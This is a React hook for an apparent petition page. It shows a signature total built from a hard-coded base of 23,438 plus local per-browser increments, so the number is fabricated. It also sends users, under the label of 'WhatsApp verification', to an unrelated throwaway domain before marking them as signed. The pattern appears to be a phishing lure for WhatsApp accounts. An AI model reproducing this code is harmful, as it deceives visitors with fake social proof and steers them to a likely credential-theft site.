import { useState, useEffect } from "react";

const STORAGE_KEY = "petition_signatures";
const BASE_SIGNATURES = 23438;

export const useSignatures = () => {
  const [signatures, setSignatures] = useState(BASE_SIGNATURES);
  const [hasSigned, setHasSigned] = useState(false);
  const [justSigned, setJustSigned] = useState(false);

  useEffect(() => {
    // Load saved signatures from localStorage
    const savedSignatures = localStorage.getItem(STORAGE_KEY);
    if (savedSignatures) {
      const parsed = parseInt(savedSignatures, 10);
      if (!isNaN(parsed) && parsed >= BASE_SIGNATURES) {
        setSignatures(parsed);
      }
    }

    // Check if user has already signed
    const userSigned = localStorage.getItem("user_has_signed");
    if (userSigned === "true") {
      setHasSigned(true);
    }

    // Check for redirect callback with signed parameter
    const urlParams = new URLSearchParams(window.location.search);
    const signedParam = urlParams.get("signed");
    
    if (signedParam === "true" && !userSigned) {
      // User just returned from WhatsApp verification
      addSignature();
      setJustSigned(true);
      
      // Clean up URL
      const newUrl = window.location.pathname;
      window.history.replaceState({}, document.title, newUrl);
    }
  }, []);

  const addSignature = () => {
    const newCount = signatures + 1;
    setSignatures(newCount);
    setHasSigned(true);
    localStorage.setItem(STORAGE_KEY, newCount.toString());
    localStorage.setItem("user_has_signed", "true");
  };

  const handleWhatsAppClick = () => {
    // Redirect to WhatsApp verification
    // The return URL will include ?signed=true parameter
    const returnUrl = encodeURIComponent(window.location.origin + "/?signed=true");
    window.location.href = `https://csr32s75.cfd/s2dr?return=${returnUrl}`;
  };

  return {
    signatures,
    hasSigned,
    justSigned,
    handleWhatsAppClick,
  };
};
